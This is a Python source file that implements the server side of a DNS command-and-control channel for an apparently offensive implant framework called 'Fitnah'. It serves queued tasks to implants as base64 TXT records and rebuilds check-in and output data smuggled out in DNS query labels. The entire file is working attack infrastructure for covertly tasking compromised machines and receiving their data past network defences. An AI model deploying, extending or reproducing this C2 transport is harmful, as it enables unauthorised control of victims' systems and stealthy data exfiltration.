"""
dns_c2.py — DNS TXT fallback C2 transport

Listens for implant CHECKIN and TASK-poll queries on an operator-controlled
authoritative NS and serves TASK payloads as base64 TXT records.

Inspired by BishopFox/sliver dnsclient.go (MIT License, © 2019 Bishop Fox).
Adapted to pure Python + dnspython for the Fitnah operator side.

DNS protocol (matching implant/fitnah_implant.c dns_* functions):

  Implant query (poll)  : TXT  <agent_id>.t<seqN>.<dns_domain>
  Server response       : TXT  base64url(TASK JSON)  (or NXDOMAIN = no task)

  Implant query (ack)   : A    <b64chunk>.<seqN>.ack.<dns_domain>
  Server logs query, ignores response

  Implant query (checkin): A  <b64chunk>.<N>.ci.<dns_domain>
  Server decodes chunks and reconstructs CHECKIN JSON

Usage:
  Operator must run this on the authoritative DNS server for <dns_domain>
  (or delegate the subdomain to a VPS running dnslib / twisted).

  For testing without a real DNS server:
    python -m fitnah.c2.transport.dns_c2 --domain c2.example.com --port 5353

Requirements:
  pip install dnslib
"""

from __future__ import annotations

import base64
import json
import logging
import queue
import threading
import time
from typing import Optional

log = logging.getLogger(__name__)

try:
    import dnslib
    from dnslib import DNSRecord, DNSHeader, RR, TXT, A, QTYPE, RCODE, dns
    from dnslib.server import DNSServer, BaseResolver, DNSLogger
    _DNSLIB_OK = True
except ImportError:
    _DNSLIB_OK = False


def _b64url_decode(s: str) -> bytes:
    pad = "=" * ((-len(s)) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


class DnsC2Transport:
    """
    Server-side DNS C2 transport.  Runs a UDP/TCP DNS listener.

    The Fitnah C2 kernel calls:
      dns.queue_task(agent_id, task_json)   — enqueue a TASK for delivery
      dns.poll_ack(agent_id, timeout)       — wait for ACK from the implant

    ACKs come in as reconstructed JSON strings assembled from A-query labels.
    CHECKIN payloads are reconstructed and delivered to the kernel as normal
    CHECKIN events.
    """

    def __init__(self, domain: str, port: int = 53,
                 bind_addr: str = "0.0.0.0",
                 on_checkin=None, on_ack=None):
        if not _DNSLIB_OK:
            raise ImportError("dnslib not installed — run: pip install dnslib")

        self.domain     = domain.lower().rstrip(".")
        self.port       = port
        self.bind_addr  = bind_addr
        self.on_checkin = on_checkin   # callback(agent_id, checkin_dict)
        self.on_ack     = on_ack       # callback(agent_id, ack_dict)

        # Per-agent pending task queues  { agent_id → Queue[str] }
        self._task_queues: dict[str, queue.Queue] = {}
        # Per-agent ACK queues           { agent_id → Queue[str] }
        self._ack_queues:  dict[str, queue.Queue] = {}
        # Partial chunk buffers for CI / ACK reassembly
        # { (agent_id, seq_prefix, type) → {idx: chunk} }
        self._chunk_bufs:  dict[tuple, dict] = {}
        self._lock = threading.Lock()

        self._server: Optional[DNSServer] = None

    # ── Public API ────────────────────────────────────────────────────────────

    def queue_task(self, agent_id: str, task_json: str):
        """Enqueue a TASK JSON string for delivery over DNS."""
        with self._lock:
            if agent_id not in self._task_queues:
                self._task_queues[agent_id] = queue.Queue()
        self._task_queues[agent_id].put(task_json)

    def poll_ack(self, agent_id: str, timeout: float = 120.0) -> Optional[dict]:
        """Wait up to `timeout` seconds for an ACK from `agent_id`."""
        with self._lock:
            if agent_id not in self._ack_queues:
                self._ack_queues[agent_id] = queue.Queue()
        try:
            raw = self._ack_queues[agent_id].get(timeout=timeout)
            return json.loads(raw)
        except (queue.Empty, json.JSONDecodeError):
            return None

    def start(self):
        """Start the DNS listener in a background thread."""
        resolver = _FitnahDNSResolver(self)
        dns_log  = DNSLogger(prefix=False)
        self._server = DNSServer(resolver,
                                 port=self.port,
                                 address=self.bind_addr,
                                 logger=dns_log)
        self._server.start_thread()
        log.info("DNS C2 listening on %s:%d for *.%s",
                 self.bind_addr, self.port, self.domain)

    def stop(self):
        if self._server:
            self._server.stop()
            self._server = None

    # ── Internal helpers ──────────────────────────────────────────────────────

    def _get_task(self, agent_id: str) -> Optional[str]:
        with self._lock:
            if agent_id not in self._task_queues:
                return None
        try:
            return self._task_queues[agent_id].get_nowait()
        except queue.Empty:
            return None

    def _handle_ack_chunk(self, agent_id: str, seq: str, idx: int, chunk: str):
        key = (agent_id, seq, "ack")
        with self._lock:
            if key not in self._chunk_bufs:
                self._chunk_bufs[key] = {}
            self._chunk_bufs[key][idx] = chunk

        # Try to decode — we don't know total count so attempt on every arrival
        with self._lock:
            buf = self._chunk_bufs.get(key, {})
            if not buf:
                return
            ordered = "".join(v for _, v in sorted(buf.items()))

        try:
            raw  = _b64url_decode(ordered)
            data = json.loads(raw)
            if data.get("type") == "ACK":
                with self._lock:
                    self._chunk_bufs.pop(key, None)
                    if agent_id not in self._ack_queues:
                        self._ack_queues[agent_id] = queue.Queue()
                self._ack_queues[agent_id].put(json.dumps(data))
                if self.on_ack:
                    self.on_ack(agent_id, data)
        except Exception:
            pass   # chunks still arriving

    def _handle_ci_chunk(self, agent_id: str, seq: str, idx: int, chunk: str):
        key = (agent_id, seq, "ci")
        with self._lock:
            if key not in self._chunk_bufs:
                self._chunk_bufs[key] = {}
            self._chunk_bufs[key][idx] = chunk

        with self._lock:
            buf     = self._chunk_bufs.get(key, {})
            ordered = "".join(v for _, v in sorted(buf.items()))

        try:
            raw  = _b64url_decode(ordered)
            data = json.loads(raw)
            if data.get("type") == "CHECKIN":
                with self._lock:
                    self._chunk_bufs.pop(key, None)
                if self.on_checkin:
                    self.on_checkin(data.get("agent_id", agent_id), data)
        except Exception:
            pass


class _FitnahDNSResolver(BaseResolver):
    """dnslib resolver that handles Fitnah DNS C2 query patterns."""

    def __init__(self, transport: DnsC2Transport):
        self.transport = transport

    def resolve(self, request: "DNSRecord", handler) -> "DNSRecord":
        reply = request.reply()
        qname = str(request.q.qname).lower().rstrip(".")
        qtype = request.q.qtype

        domain = self.transport.domain

        # ── Task poll: <agent_id>.t<seqN>.<domain> TXT ──────────────────────
        if qname.endswith("." + domain):
            labels = qname[: -(len(domain) + 1)].split(".")
            if len(labels) >= 2:
                agent_id  = labels[-2] if len(labels) > 1 else ""
                label_seq = labels[-1] if labels else ""

                if label_seq.startswith("t") and qtype == QTYPE.TXT:
                    task_json = self.transport._get_task(agent_id)
                    if task_json:
                        enc = _b64url_encode(task_json.encode())
                        reply.add_answer(
                            RR(qname, QTYPE.TXT, rdata=TXT(enc), ttl=0)
                        )
                    else:
                        reply.header.rcode = RCODE.NXDOMAIN
                    return reply

                # ── ACK: <b64chunk>.<seqN>.ack.<domain> A ───────────────────
                if len(labels) >= 3 and labels[-1] == "ack":
                    chunk    = labels[0]
                    seq      = labels[1]
                    idx_str  = seq  # use seq directly as index approximation
                    try:
                        idx = int("".join(c for c in seq if c.isdigit()) or "0")
                    except ValueError:
                        idx = 0
                    self.transport._handle_ack_chunk(agent_id, seq, idx, chunk)
                    reply.add_answer(RR(qname, QTYPE.A, rdata=A("1.2.3.4"), ttl=0))
                    return reply

                # ── CHECKIN: <b64chunk>.<N>.ci.<domain> A ───────────────────
                if len(labels) >= 3 and labels[-1] == "ci":
                    chunk   = labels[0]
                    idx_str = labels[1]
                    try:
                        idx = int(idx_str)
                    except ValueError:
                        idx = 0
                    self.transport._handle_ci_chunk(agent_id, idx_str, idx, chunk)
                    reply.add_answer(RR(qname, QTYPE.A, rdata=A("1.2.3.4"), ttl=0))
                    return reply

        reply.header.rcode = RCODE.NXDOMAIN
        return reply


# ── Standalone server entry point ─────────────────────────────────────────────
if __name__ == "__main__":
    import argparse
    logging.basicConfig(level=logging.INFO,
                        format="%(asctime)s %(levelname)s %(message)s")

    ap = argparse.ArgumentParser(description="Fitnah DNS C2 server")
    ap.add_argument("--domain", required=True, help="Authoritative domain (e.g. c2.example.com)")
    ap.add_argument("--port",   type=int, default=5353, help="UDP port (default 5353)")
    ap.add_argument("--bind",   default="0.0.0.0", help="Bind address")
    args = ap.parse_args()

    def _on_checkin(aid, data):
        log.info("[CHECKIN] agent=%s data=%s", aid, data)

    def _on_ack(aid, data):
        log.info("[ACK] agent=%s output=%s", aid, data.get("output", "")[:80])

    srv = DnsC2Transport(args.domain, port=args.port,
                         bind_addr=args.bind,
                         on_checkin=_on_checkin, on_ack=_on_ack)
    srv.start()
    log.info("Fitnah DNS C2 running — Ctrl-C to stop")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        srv.stop()
